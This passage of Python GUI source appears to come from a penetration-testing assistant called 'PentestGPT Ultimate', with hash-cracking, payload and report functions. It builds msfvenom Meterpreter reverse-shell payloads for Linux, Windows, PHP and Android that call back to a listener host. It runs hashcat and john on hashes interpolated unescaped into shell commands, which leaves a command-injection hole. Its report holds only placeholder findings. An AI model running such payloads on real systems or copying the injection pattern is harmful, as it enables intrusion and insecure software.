            self.add_chat_message("Please upload an APK file to analyze.", 'system')
            
    def cloud_assess(self):
        """Assess cloud security"""
        self.add_chat_message("Cloud security assessment requires cloud provider credentials.", 'system')
        # Add cloud assessment logic here
        
    def crack_hash(self):
        """Crack password hash"""
        # Simple hash cracking dialog
        hash_value = tk.simpledialog.askstring("Hash Cracker", "Enter hash to crack:")
        if hash_value:
            self.add_chat_message(f"Attempting to crack hash: {hash_value[:20]}...", 'system')
            # Determine hash type and use appropriate tool
            if len(hash_value) == 32:
                self.execute_terminal_command(f"echo '{hash_value}' | hashcat -m 0 -a 0 /usr/share/wordlists/rockyou.txt")
            elif len(hash_value) == 40:
                self.execute_terminal_command(f"echo '{hash_value}' | hashcat -m 100 -a 0 /usr/share/wordlists/rockyou.txt")
            else:
                self.add_chat_message("Hash type not recognized. Trying john the ripper...", 'system')
                self.execute_terminal_command(f"echo '{hash_value}' > /tmp/hash.txt && john /tmp/hash.txt")
                
    def run_exploit(self):
        """Run exploitation framework"""
        if self.current_target:
            self.add_chat_message(f"Preparing exploit options for {self.current_target}...", 'system')
            # Switch to exploit tab
            self.tool_notebook.select(3)
        else:
            messagebox.showinfo("No Target", "Please set a target first.")
            
    def generate_payload(self):
        """Generate custom payload"""
        payload_type = self.payload_type.get()
        platform = self.payload_platform.get()
        
        self.add_chat_message(f"Generating {payload_type} payload for {platform}...", 'system')
        
        # Example msfvenom command
        if payload_type == 'reverse_shell':
            if platform == 'linux':
                cmd = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf"
            elif platform == 'windows':
                cmd = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe"
            elif platform == 'web':
                cmd = "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php"
            else:
                cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 R > shell.apk"
                
            self.execute_terminal_command(cmd)
            
    def generate_report(self):
        """Generate penetration test report"""
        format_type = self.report_format.get()
        self.add_chat_message(f"Generating {format_type} report...", 'system')
        
        # Create report content
        report = f"""
# Penetration Test Report
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Target: {self.current_target or 'Not specified'}

## Executive Summary
This report contains the results of the penetration test performed using PentestGPT Ultimate.

## Scan Results
{len(self.scan_results)} scans performed

## Vulnerabilities Found
To be populated with actual findings

## Recommendations
1. Apply security patches
2. Implement network segmentation
3. Enable logging and monitoring

---
Generated by PentestGPT Ultimate
"""
        
        # Display in preview
        self.report_preview.delete(1.0, tk.END)
        self.report_preview.insert(1.0, report)
        
        # Switch to reports tab
        self.tool_notebook.select(4)
        
    def show_help(self):
        """Show help information"""
        help_text = """
Available commands and features:

Natural Language Commands:
‚Ä¢ "Scan the network" - Performs network reconnaissance
‚Ä¢ "Test the website" - Runs web application tests
‚Ä¢ "Find vulnerabilities" - Searches for security issues
‚Ä¢ "Generate payload" - Creates custom exploits
‚Ä¢ "Analyze this file" - Examines uploaded files

Direct Terminal Commands:
‚Ä¢ Use $ prefix for direct commands (e.g., $nmap -sV target)

Quick Actions:
‚Ä¢ Use the buttons at the bottom for common tasks
‚Ä¢ Set your target in the header field
‚Ä¢ Upload files using the üìé button

Tips:
‚Ä¢ All scan results are saved automatically
‚Ä¢ Use the tabs to view different aspects of your test
‚Ä¢ Generate reports in multiple formats
"""
        self.add_chat_message(help_text, 'ai')
        
    def run(self):
        """Start the application"""
        self.root.mainloop()

def main():
    """Main entry point"""
    app = UltimatePentestGUI()
    app.run()

if __name__ == "__main__":
    main()
